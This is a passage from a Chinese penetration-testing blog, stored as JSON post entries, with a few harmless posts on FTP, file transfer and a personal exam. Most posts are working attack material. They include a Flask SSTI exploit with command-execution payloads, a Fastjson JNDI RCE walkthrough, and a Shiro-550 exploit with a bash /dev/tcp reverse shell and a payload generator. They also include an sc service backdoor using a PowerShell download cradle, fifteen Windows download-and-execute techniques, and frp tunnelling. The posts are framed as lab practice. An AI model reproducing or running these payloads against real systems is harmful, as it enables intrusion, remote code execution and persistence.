['http://www.xpshuai.cn']  # 漏洞地址来源，0day可以不写\n    name = 'Python Flask SSTI(服务端模板注入)漏洞'      # POC名称\n    appPowerLink = 'http://www.xpshuai.cn'   # 漏洞厂商的主页地址\n    appName = 'Flask'       # 漏洞应用名称\n    appVersion = 'All'      # 漏洞影响版本\n    # vulType = VUL_TYPE.OTHER      # 漏洞类型(这里我瞎选的)\n    desc = '''\n        SSTI(Server-Side Template Injection)服务端模板注入，\n        就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式\n    '''\n    samples = ['']  # 漏洞样例，使用poc测试成功的网站\n    install_requies = []\n\n    def _options(self): # 接收用户外部输出参数command\n        o = OrderedDict()\n        payload = {\n            \"nc\": REVERSE_PAYLOAD.NC,\n            \"bash\": REVERSE_PAYLOAD.BASH,\n        }\n        o[\"command\"] = OptDict(selected=\"bash\", default=payload)\n        return o\n\n    def _verify(self):\n        '''\n        验证模式\n        '''\n        result = {}\n        # 这里写验证代码...\n        path = \"/?name=\"\n        url = self.url + path\n        payload = \"{{22*22}}\"\n        # 第一次请求\n        try:\n            resq = requests.get(url + payload)\n            if resq and resq.status_code == 200 and \"484\" in resq.text:\n                result['VerifyInfo'] = {}   # 创建自定义的字典信息\n                result['VerifyInfo']['URL'] = url\n                result['VerifyInfo']['Payload'] = payload\n        except Exception as e:\n            pass\n        return self.parse_output(result)\n\n    def _attack(self):\n        '''\n        攻击模式\n        '''\n        result = {}\n        path = \"/?name=\"\n        url = self.url + path\n        cmd = self.get_option(\"command\")    # 获取command参数\n        payload = \"%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22' \"+ cmd + \"'%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D\"\n        try:\n            resq = requests.get(url + payload)\n            if resq and resq.status_code == 200 and \"www\" in resq.text:\n                result['VerifyInfo'] = {}\n                result['VerifyInfo']['URL'] = url\n                result['VerifyInfo']['Name'] = payload\n        except Exception as e:\n            pass\n        return self.parse_output(result)\n\n\t\n\t# 检测返回结果数据统一封装到这个方法里进行处理\n    def parse_output(self, result):\n        output = Output(self)\n        if result:\n            output.success(result)\n        else:\n            output.fail('target is not vulnerable')\n        return output\n\n\n# 注册POC类，千万不要忘记哦~~~\nregister_poc(FlaskPOCEXP)\n\n```\n\n运行：\n\n```bash\npocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify  --command 'whoami'\n```\n\n![](http://image.xpshuai.cn/pocsuite_flask_cmd.png)\n\n\n\n\n\n\n\n\n\n\n\n","tags":["pocsuite"],"categories":["渗透测试"]},{"title":"Web安全简要思维导图","url":"%2Fposts%2F20550%2F","content":"\n前几天重新读了一下道哥的《白帽子讲Web安全》，于是做了个粗略的思维导图：\n\n![思维图](http://image.xpshuai.cn/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8.png)\n\n\n\nxmind原始格式地址：https://www.jianguoyun.com/p/DX5jC4wQ59WFCBjWvtYD\n\n\n\n\n\n","tags":["读书笔记"],"categories":["渗透测试"]},{"title":"使用sz与rz命令在Xshell上下载和上传文件","url":"%2Fposts%2F35401%2F","content":"\n### 概述\n\n#### 安装\n\n```bash\nsudo apt-get install lrzsz\n```\n\n\n\n#### 常见参数\n\n```bash\n参数\t参数说明\n-a\t以文本方式传输（ascii）\n-b\t以二进制方式传输（binary）\n-e\t对控制字符转义（escape），这可以保证文件传输正确\n```\n\n\n\n#### 两个命令：\n\n- sz：从xshell里面的服务器下载文件到本机\n- rz：从主机上传文件到xshell里面的服务器\n\n### sz用法：\n\n 下载一个文件\n\n```bash\nsz file_name \n```\n\n下载多个文件\n\n```bash\nsz file_name1 file_name2\n```\n\n下载指定目录下的所有文件，不包含该目录下的文件夹\n\n```bash\nsz test_dir/*\n```\n\n\n\n### rz用法：\n\n输入rz回车后，会出现文件选择对话框，选择需要上传文件，一次可以指定多个文件，上传到服务器的路径为当前执行rz命令的目录。","tags":["文件传输"],"categories":["Linux"]},{"title":"Fastjson反序列化","url":"%2Fposts%2F21856%2F","content":"\n\n\n## 简介\n\nfastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。可以通过反序列化导致远程命令执行。\n\n\n\n\n\n## 漏洞检测方法\n\n### DNSLog回显\n\n下面有多个请求，分别放到请求数据包部分(可能某个不适用, 多试几个)，通过构造DNS解析来判断是否是Fastjson，Fastjson在解析下面这些Payload时会取解析val的值，从而可以**在dnslog接收到回显**，**以此判断是不是Fastjson**\n\n```json\n{\"a\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"xxx.dnslog.cn\"}}\n\n{\"@type\":\"java.net.Inet4Address\",\"val\":\"xxx.dnslog.cn\"}\n{\"@type\":\"java.net.Inet6Address\",\"val\":\"xxx.dnslog.cn\"}\n{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"xxx.dnslog.cn\"}}\n{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"xxx.dnslog.cn\"}}\"\"}\n{{\"@type\":\"java.net.URL\",\"val\":\"xxx.dnslog.cn\"}:\"aaa\"}\nSet[{\"@type\":\"java.net.URL\",\"val\":\"xxx.dnslog.cn\"}]\nSet[{\"@type\":\"java.net.URL\",\"val\":\"xxx.dnslog.cn\"}\n{{\"@type\":\"java.net.URL\",\"val\":\"xxx.dnslog.cn\"}:0\n```\n\n\n\n### 增加key\n\nJava语言中常用的Json处理主要是Fastjson和Jackson，相对而言，Jackson比较严格，强制Key和JavaBean属性对齐，只能少Key不能多Key，所以可以通过增加一个Key看响应包会不会报错来判断。\n\n\n\n## 利用复现\n\n这里用的docker环境\n\n<img src=\"http://image.xpshuai.cn/fj1.jpg\"></img>\n\n\n\n1.查看数据包，可以用上面的`漏洞检测`的方法来判断\n\n<img src=\"http://image.xpshuai.cn/fj2.jpg\"></img>\n\n\n\n\n\n2.vps用nc监听端口8888\n\n```bash\nnc -lvvp 8888\n```\n\n\n\nEXP地址：https://github.com/CaijiOrz/fastjson-1.2.47-RCE\n\n3.修改exp中反弹shell的服务器地址和为我们的\n\n<img src=\"http://image.xpshuai.cn/fj3.jpg\"></img>\n\n\n\n4.使用javac进行编译，然后会生成一个Exploit.class文件\n\n```bash\njavac Exploit.java\n```\n\n<img src=\"http://image.xpshuai.cn/fj4.jpg\"></img>\n\n\n\n5.在Exploit.class的目录下开启python的简单http服务，相当于访问就能下载\n\n```bash\npython -m SimpleHTTPServer 8080\n```\n\n<img src=\"http://image.xpshuai.cn/fj5.jpg\"></img>\n\n6.执行下面的命令开启RMI/LDAP服务\n\n```bash\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.43.102:8080/#Exploit\" 9999\t#8080是前面SimpleHTTPServer的端口\n\n```\n\n<img src=\"http://image.xpshuai.cn/fj6.jpg\"></img>\n\n\n\n\n\n\n\n7.构造exp请求包\n\n```json\n# 1.2.47以下版本\n{\n    \"a\":{\n        \"@type\":\"java.lang.Class\",\n        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n    },\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://192.168.43.102:9999/Exploit\",\n        \"autoCommit\":true\n    }\n}\n\n\n\n\n\n\n\n# 1.2.24以下版本\n{\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://同上类文件地址:9999/TouchFile\",\n        \"autoCommit\":true\n    }\n}\n\n```\n\n\n\n8.构造好的请求包发送如下，注意：Content-type格式要`json`，并且是`post`请求\n\n```bash\nContent-type: application/json\n```\n\n<img src=\"http://image.xpshuai.cn/fj7.jpg\"></img>\n\n\n\n9.接收到反弹回来的shell\n\n<img src=\"http://image.xpshuai.cn/fj8.jpg\"></img>\n\n\n\n\n\n参考：https://www.naraku.cn/posts/86.html\n\n","tags":["靶场实验"],"categories":["渗透测试"]},{"title":"Shiro rememberMe反序列化漏洞(Shiro-550)复现","url":"%2Fposts%2F40239%2F","content":"\n### 漏洞原理\n\nApache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。\n**Payload产生的过程：**\n命令=>序列化=>AES加密=>base64编码=>RememberMe Cookie值\n在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。\n\n### 影响版本\n\nApache Shiro < 1.2.4\n\n\n\n### 特征判断\n\n返回包中包含`rememberMe=deleteMe`字段\n\n\n\n### 演示\n\n> 文中的配图有点不一致，别介意，环境问题\n\n\n\n#### 系统界面如图\n\n<img src=\"http://image.xpshuai.cn/shiro1.jpg\"></img>\n\n\n\n#### 抓包查看\n\n可以看到是Shiro\n\n<img src=\"http://image.xpshuai.cn/shiro2.jpg\"></img>\n\n#### 1.检查是否存在默认的key\n\n工具链接：https://github.com/insightglacier/Shiro_exploit\n\n```bash\npython shiro_exploit.py -u http://<IP>:7080\n```\n\n检测的key保存下来一会用\n\n\n\n#### 2.制作反弹shell代码\n\n2.1 vps监听端口\n\n```bash\nnc -lvvp 7788\n```\n\n<img src=\"http://image.xpshuai.cn/shiro3.jpg\"></img>\n\n2.2 Java Runtime 配合 bash 编码，\n在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html\n\n```bash\nbash -i >& /dev/tcp/202.xx.xx.xx/7788 0>&1\t# ip为攻击机的地址\n```\n\n<img src=\"http://image.xpshuai.cn/shiro4.jpg\"></img>\n\n#### 3.通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令\n\n上一步的反弹shell的命令编码结果写到下面\n\n```bash\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections6 'bash -c {echo,YmFzaCAtxxxxxxzYuxxxxxxxxxxxxQ==}|{base64,-d}|{bash,-i}'\t# 这里用的CommonsCollections4\n```\n\n<img src=\"http://image.xpshuai.cn/shiro5.jpg\"></img>\n\n#### 4.使用shiro.py 生成Payload\n\n```bash\npython shiro.py 122.xx.xx.xx:6666\n```\n\n<img src=\"http://image.xpshuai.cn/shiro6.jpg\"></img>\n\n其中shiro.py代码如下：\n\n```bash\nimport sys\nimport uuid\nimport base64\nimport subprocess\nfrom Crypto.Cipher import AES\ndef encode_rememberme(command):\n    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections6', command], stdout=subprocess.PIPE)\t# 这里要注意用哪个JRMPClient\n    BS = AES.block_size\n    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n    key = base64.b64decode(\"fCq+/xW488hMTCD+cmJ3aQ==\")\t# 这里的key要提前枚举出来\n    iv = uuid.uuid4().bytes\n    encryptor = AES.new(key, AES.MODE_CBC, iv)\n    file_body = pad(popen.stdout.read())\n    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))\n    return base64_ciphertext\n\nif __name__ == '__main__':\n    payload = encode_rememberme(sys.argv[1])   \nprint \"rememberMe={0}\".format(payload.decode())\n\n\n```\n\n\n\n#### 5.构造数据包，伪造cookie，发送Payload.\n\n<img src=\"http://image.xpshuai.cn/shiro7.jpg\"></img>\n\n#### 6.nc监听端口，shell成功反弹\n\n<img src=\"http://image.xpshuai.cn/shiro8.jpg\"></img>\n\n------\n\n\n\nPS：[后来发现这个好用的工具](https://github.com/feihong-cs/ShiroExploit)，一键检测&getshell，好用极了\n\n\n\n> 我应该去学学java编程了，看大佬们写的各种工具，羡慕极了","tags":["Shiro反序列化"],"categories":["渗透测试"]},{"title":"FTP两种模式","url":"%2Fposts%2F57750%2F","content":"\n\n\n> 主被动模式，阐述的是数据传输过程\n>\n> 主被动模式，选择权在客户机上！\n\n> 所谓主或被，是站在服务器角度说的\n\n\n\n### 主动模式\n\n端口：`21端口(控制端口) + 20端口(数据端口)`\n\n传输数据的时候服务器主动-->主动模式\n\n服务器的20主动向客户机的随机端口拨号，建立数据通道\n\n\n\n> 所以说，如果客户机开着防火墙，你用主动模式是连接不上FTP服务器的(服务端访问客户端的'随机'端口会被客户机防火墙拦截)\n>\n> 主动模式不适合客户机开防火墙时候使用\n\n\n\n<img src=\"http://image.xpshuai.cn/%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8Fftp.jpg\" alt=\"盗张图\"></img>\n\n\n\n\n\n### 被动模式\n\n端口：`21端口(控制端口) + 随机端口(作为数据端口)`\n\n传输数据的时候服务器被动-->被动模式\n\n客户机主动向服务器的随机端口拨号，建立数据通道\n\n\n\n> 所以说，如果服务器开着防火墙，你用被动模式是连接不上FTP服务器的(客户机访问服务器的随机端口会被服务器防火墙所拦截)\n>\n> 被动模式不适合服务机开防火墙时候使用\n\n\n\n<img src=\"http://image.xpshuai.cn/%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8Fftp.jpg\" alt=\"盗张图\"></img>","tags":["主动模式 被动模式"],"categories":["FTP"]},{"title":"Windows sc命令与权限维持","url":"%2Fposts%2F65109%2F","content":"\n`sc`命令用来创建和删除windows服务\n\n#### 使用SC命令创建windows服务\n\n**命令格式：**\n\n```bash\nsc [servername] create Servicename [Optionname= Optionvalues]\n```\n\n```bash\n# servername\n可选，可以使用双斜线，如\\\\\\\\myserver，也可以是\\\\\\\\192.168.0.1来操作远程计算机。如果在本地计算机上操作就不用添加任何参数。\n\n# Servicename\n在注册表中为service key制定的名称。注意这个名称是不同于显示名称的（这个名称可以用net start和服务控制面板看到），而SC是使用服务键名来鉴别服务的。\n\n# Optionname\n这个optionname和optionvalues参数允许你指定操作命令参数的名称和数值。注意，这一点很重要在操作名称和等号之间是没有空格的。\n如果你想要看每个命令的可以用的optionvalues，你可以使用sc command这样的格式。这会为你提供详细的帮助。\n\n# Optionvalues\n为optionname的参数的名称指定它的数值。有效数值范围常常限制于哪一个参数的optionname。如果要列表请用sc command来询问每个命令。\n```\n\n\n\n示例：\n\n```bash\nsc create svnservice binpath= \"\\\"D:\\Servers\\Subversion\\bin\\svnserve.exe\\\" --service -r E:\\SVN\\repository\" displayname= \"SVNService\" depend= Tcpip start= auto  \n\n```\n\n注意：\n\n1. 在`option= xxxxx`格式中，`=`号和后面的内容一定要有空格，如`depend=  Tcpip`\n\n2. 如果命令中的需要进行双引号的嵌套，使用反斜杠加引号 `\\\"`来进行转义处理。\n\n\n\n#### 使用SC命令删除windows服务\n\n从注册表中删除服务子项。如果服务正在运行或者另一个进程有一个该服务的打开句柄，那么此服务将标记为删除。\n\n语法：\n\n```bash\nsc [ServerName] delete [ServiceName] \n```\n\n示例：\n\n```bash\nsc delete svnservice\n```\n\n\n\n\n\n#### 服务自启动后门\n\n这里使用Cobalt Strike生成了一个powershell的下载后门的payload（菜单栏，Attacks-->Web Drive\n\n-by-->Scaripted Web Delivery，生成powershell后门）\n\n```bash\nsc create \"Name\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" \n\nsc description Name \"Just For Test\" # 设置服务的描述字符串 \nsc config Name start= auto\t # 设置这个服务为自动启动 \nnet start Name ``# 启动服务\n\n# 重启服务器后，成功返回一个shell\n```\n\n","tags":["权限维持"],"categories":["渗透测试"]},{"title":"Windows命令行下载文件方法","url":"%2Fposts%2F54938%2F","content":"\n当我们通过Web方式获取了一个Shell，而目标主机是Windows，我们下面后门文件到目标主机**一般有两种方式：**\n\n1. 远程下载文件到本地，然后再执行；\n\n2. 远程下载执行，执行过程没有二进制文件落地（这种方式已然成为后门文件下载执行的首要方式）\n\n\n\n**常见的下载方式**\n\n- PowerShell\n- Bitsadmin\n- certutil\n- wget\n- ipc$文件共享\n- FTP\n- TFTP\n- WinScp\n- msiexec\n- IEExec\n- mshta\n- rundll32\n- regsvr32\n- MSXSL.EXE\n- pubprn.vbs\n\n\n\n\n\n### 1.Powershell\n\n远程下载文件保存在本地：\n\n```bash\npowershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.115/payload.txt','payload.exe')\n```\n\n\n\n远程执行命令：\n\n```bash\npowershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))\"\n```\n\n\n\n### 2.Bitsadmin\n\nbitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。\n\n```bash\nbitsadmin /transfer n http://192.168.28.128/imag/evil.txt D:\\1.txt\n```\n\n\n\n### 3.certutil\n\n用于备份证书服务，支持xp-win10。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。\n\n注：缓存目录为`%USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content`\n\n```bash\n#下载文件 \ncertutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php \n#删除缓存 \ncertutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete\n```\n\n\n\n### 4.wget\n\nWindows环境下，可上传免安装的可执行程序wget.exe到目标机器，然后使用wget下载文件。\n\n下载地址：https://eternallybored.org/misc/wget/\n\n```bash\nwget -O \"evil.txt\" http://192.168.28.128/imag/evil.txt\n```\n\n\n\n### 5.ipc$文件共享\n\nIPC$(Internet Process Connection)是共享\"命名管道\"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。\n\n```bash\n#建立远程IPC连接 \nnet use \\\\192.168.28.128\\ipc$ /user:administrator \"abc123!\" \n\n#复制远程文件到本地主机 \ncopy \\\\192.168.28.128\\c$\\2.txt D:\\test\n```\n\n\n\n\n\n### 6.FTP\n\n一般情况下，攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。\n\n```bash\nftp 127.0.0.1 \t# 这里换成我们装有payload的服务器的IP地址\nusername # 输入用户名\npassword \t# 密码\nget file \t# 下载的payload文件\nexit \n```\n\n\n\n\n\n### 7.TFTP\n\n用来下载远程文件的最简单的网络协议，它基于`UDP`协议而实现\n\ntftp32服务端下载地址：http://tftpd32.jounin.net/tftpd32_download.html\n\n```bash\ntftp -i <你的payload的IP> get <要下载payload文件> <存放目标机器的目录位置>\n```\n\n\n\n### 8.WinScp\n\nWinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。\n\n```bash\n#上传 \nwinscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"put D:\\1.txt /tmp/\" \"exit\" /log=log_file.txt \n\n#下载 \nwinscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"get /tmp D:\\test\\app\\\" \"exit\" /log=log_file.tx\n```\n\n\n\n### 9.msiexec\n\nmsiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：\n\n```bash\n#在攻击机器上生成msi包 \nmsfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi \n\n#在目标机器上远程执行（直接写payload的ip和文件） \nmsiexec /q /i http://192.168.28.128/evil.msi\n```\n\n\n\n### 10.IEExec\n\nIEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。\n\n先在攻击机生成Payload：\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe\n```\n\n使用管理员身份打开cmd，分别运行下面两条命令。\n\n```bash\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727>caspol.exe -s off\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe\n```\n\n\n\n\n\n### 11.mshta\n\nmshta用于执行`.hta`文件，而hta是`HTML Applocation`的缩写，也就是HTML应用程序。\n\n而hta中也支持VBS。所以我们可以利用hta来下载文件。\n\n**1.生成payload.hta**\n\nrun.hta内容如下：\n\n```html\n<HTML> \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n    <HEAD> \n        <script language=\"VBScript\"> \n            Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(\"Wscript.Shell\") objShell.Run \"cmd.exe /c net user test password /add\" // 这里填写命令 self.close \n        </script> \n        <body> demo </body> \n    </HEAD> \n</HTML>\n```\n\n或者参考这个文章生成hta:https://www.cnblogs.com/backlion/p/10491616.html\n\n方法1：MSFVenom\n\n```bash\n# 先生成payload\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=121.36.37.235 lport=2222 -f hta-psh > shell.hta\n\n\n# msf监听\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost 192.168.1.109\nset lport 1234\nexploit\n\n```\n\n方法2：Metasploit\n\n```bash\nuse exploit/windows/misc/hta_server\nmsf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109\nmsf exploit(windows/misc/hta_server) > exploit\n\n\n# 目标上\nmshta.exe http://192.168.1.109:8080/pKz4Kk059Nq9.hta\n```\n\n\n\n**2.然后再在目标机器执行前面生成的hta：**\n\n```bash\nmshta http://192.168.28.128/run.hta\n```\n\n\n\n\n\n### 12.rundll32\n\n其实还是依赖于`WScript.shell`这个组件在这里我们使用`JSRat`来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序(项目地址：https://github.com/Hood3dRob1n/JSRat-Py.git)。\n\n1.开始运行JSRat，监听本地8888端口。\n\n```bash\n./JSRat.py -i 192.168.0.115 -p 8888\n```\n\n2.通过url访问，可以查看到恶意代码，复制上面生成的代码\n\n3.在受害者PC运行该代码，将成功返回一个会话\n\n\n\n\n\n### 13.regsvr32\n\nRegsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行\n\n在目标机上执行：\n\n```bash\nregsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll\n# file.sct需要我们自己来构造\n```\n\n可以通过自己构造.sct文件中要执行的命令，去下载执行我们的程序(这里以弹计算器为例)：\n\n```bash\n<?XML version=\"1.0\"?>\n<scriptlet> \n    <registration progid=\"ShortJSRAT\" classid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" > \n        <script language=\"JScript\">\n        <![CDATA[ ps = \"cmd.exe /c calc.exe\"; new ActiveXObject(\"WScript.Shell\").Run(ps,0,true); ]]> \n        </script> \n    </registration> \n</scriptlet>\n```\n\n\n\n### 14.MSXSL.EXE\n\nmsxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。\n\n下载地址为：https://www.microsoft.com/en-us/download/details.aspx?id=21714\n\nmsxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：\n\n```bash\nmsxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl\n```\n\ndemo.xml\n\n```xml\n<?xml version=\"1.0\"?> \n<?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?>\n<customers> \n    <customer> \n \t\t<name>Microsoft</name>\n    </customer>\n</customers>\n```\n\nexec.xsl（这里以弹计算器为例）\n\n```xml\n<?xml version='1.0'?>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"http://mycompany.com/mynamespace\">\n<msxsl:script language=\"JScript\" implements-prefix=\"user\"> \n    function xml(nodelist) { var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\");   # 这里修改为我们要执行的命令\n    return nodelist.nextNode().xml; }\n</msxsl:script> \n<xsl:template match=\"/\"> \n<xsl:value-of select=\"user:xml(.)\"/>\n</xsl:template>\n</xsl:stylesheet>\n```\n\n\n\n\n\n### 15.pubprn.vbs\n\n在Windows 7以上版本存在一个名为`PubPrn.vbs`的微软已签名WSH脚本，其位于`C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US`，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给`GetObject()`\n\n```bash\n\"C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\" 127.0.0.1 script:https://gist.githubusercontent.com/xps/64acdkpodsk4566b04a/raw/a006a4 7e4075785016a62f7e5170ef36f5247cdb/test.sct\n```\n\ntest.sct（和13一样，这里以弹计算器为例）\n\n```xml\n<?XML version=\"1.0\"?> \n<scriptlet> \n<registration \n              description=\"Bandit\" \n              progid=\"Bandit\" \n              version=\"1.00\" \n              classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\" \t\t\t\t                 remotable=\"true\" >\n</registration> \n<script language=\"JScript\"> \n<![CDATA[ \n\t\t\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); \n\n]]> \n</script> \n</scriptlet>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["shell"],"categories":["渗透测试"]},{"title":"返校考六级","url":"%2Fposts%2F20779%2F","content":"\n  今年的六级考试，也因为疫情原因推迟到了九月份，故2020届毕业生也有了一次毕业之后再次进入到校园的一次小机会。\n\n  上午等待朋友的到来，然后一起听了听听力，背了背作文，然后中午一起去吃了麻辣拌。可能中午在家睡的时间太长，以致于匆匆忙忙赶着去考场，下午三点开考，两点四十五左右我才进到学校北门，真是失算啊。匆忙进到考场，可算是赶上了。\n\n  开考了，发下答题卡之后写名字，忽然发现自己拿起笔之后由于太长时间不动笔，都快不会写字了:smile:。省略一堆过程... ...虽然没好好备考，但是答题的过程却很认真，两个多小时一下就过去了，甚至感觉时间不够用，也许是因为这是最后一次坐在这个学校里面考试了吧。考试过程中，窗外是篮球场上打篮球的声音，久违的声音，让人感到心安而怀念。\n\n考完之后，走出尚德楼，傍晚时分，温度刚刚好，阳光刚刚好，旁边走过去的人讨论着刚考完的翻译和作文`What is worth doing is worth doing well`，奇迹般感觉自己仿佛又重新回到了大学一样，那是一种毕业之后的几个月来从未有过的心安。\n\n我有一种想要升学重新回到我的师范校园的冲动。\n\n不过由于晚上值夜班，所以没做过多停留，只能和学弟在食堂匆匆吃完饭，打车回项目上了。\n\n每个人的校园生活都值得怀念，每个人的青春都值得回忆。\n\n\n\n下面是一些当天拍的照片：\n\n<img src=\"http://image.xpshuai.cn/xuexiao1%20%281%29.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/xuexiao1%20%282%29.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/xuexiao1%20%283%29.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/xuexiao1%20%284%29.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/xuexiao1%20%285%29.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/xuexiao1%20%286%29.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/xuexiao1%20%287%29.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/xuexiao1%20%288%29.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/yh.png\"></img>","tags":["返校的诱惑"],"categories":["生活"]},{"title":"frp","url":"%2Fposts%2F23493%2F","content":"\n下载地址：https://github.com/fatedier/frp.git\n\n跨平台，根据自己情况选择使用\n\n\n\n### 配置文件\n\n#### 服务端\n\n<img src=\"http://image.xpshuai.cn/frp1.png\"></img>\n\n#### 客户端\n\n<img src=\"http://image.xpshuai.cn/frp2.jpg\"></img>\n\n\n\n\n\n### 部署\n\n#### 服务端\n\n连接到vps上，后台启动服务端\n\n```bash\nnohup ./frps -c frps.int &\njobs -l \ncat frps.log\n```\n\n#### 客户端\n\n将`frpc.exe`与`frpc.ini`传到目标机的同一目录下，直接运行\n\n```bash\nfrpc.exe -c frpc.int\n```\n\n当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到\n\n\n但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，\n\n所以可结合execute在目标机无输出执行程序。\n\n```bash\nsleep 10\nexecute c:/frpc.exe -c c:/frpc.ini\nshell netstat -ano |findstr 7007\n\n```\n\n\n\n#### Windows\n\nWindows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果。\n\n\n\n\n\n>\n>Frp的用法比较灵活且运行稳定。如可将frp服务端挂在\"肉鸡\"上，以达到隐蔽性，也可将客户端做成服务自启的形式等，实战中可自由发挥。\n\n\n\n","tags":["端口转发"],"categories":["渗透测试"]},{"title":"XSL Script Processing","url":"%2Fposts%2F45834%2F","content":"\nXSL是指扩展样式表语言(Extension Stylesheet 